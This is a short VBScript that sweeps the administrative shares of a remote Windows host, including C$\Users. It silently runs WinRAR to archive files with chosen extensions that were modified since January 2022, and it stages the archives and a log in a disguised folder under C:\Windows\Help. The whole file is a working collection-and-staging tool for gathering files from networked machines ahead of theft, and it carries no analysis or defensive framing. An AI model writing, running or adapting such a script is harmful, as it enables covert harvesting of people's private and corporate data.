Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

logfile="C:\Windows\Help\Corporate\out.log"
Set objFile = fso.CreateTextFile(logfile,True)
objFile.Write "Created log file" & vbCrLf

rar = Chr(34) & "C:\Program Files\WinRAR\Rar.exe" & Chr(34)
ip = "10.26.3.105"
fileExtensions = "C:\Windows\Help\en-US\0.txt"

For i = Asc("A") to Asc("Z")
    drive = Chr(i) & "$"
    If fso.DriveExists("\\" & ip & "\" & drive) Then
        If Chr(i) = "C" Then
            drive = drive & "\Users"
        End if
        cmd = rar & " a -r -n@" & fileExtensions & " -ta20220101000000 \\127.0.0.1\C$\Windows\Help\Corporate\" & i & ".rar \\" & ip & "\" & drive
        objFile.Write "Compressing " & drive & vbCrLf
        shell.Run cmd, 0, True
    End if

Next

objFile.Write "Completed"
objFile.Close
